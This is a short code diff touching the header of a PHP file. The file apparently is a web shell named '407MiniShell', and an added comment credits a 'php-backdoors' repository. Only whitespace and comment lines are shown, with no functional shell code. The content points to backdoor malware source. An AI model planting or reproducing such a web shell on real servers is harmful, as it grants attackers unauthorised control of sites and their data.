@@ -1,5 +1,5 @@
-  <?php
-
+<?php
+// from https://github.com/1337r0j4n/php-backdoors
 //407MiniShell
 //make full with love
 //sesuai yang dia inginkan dulu hehe
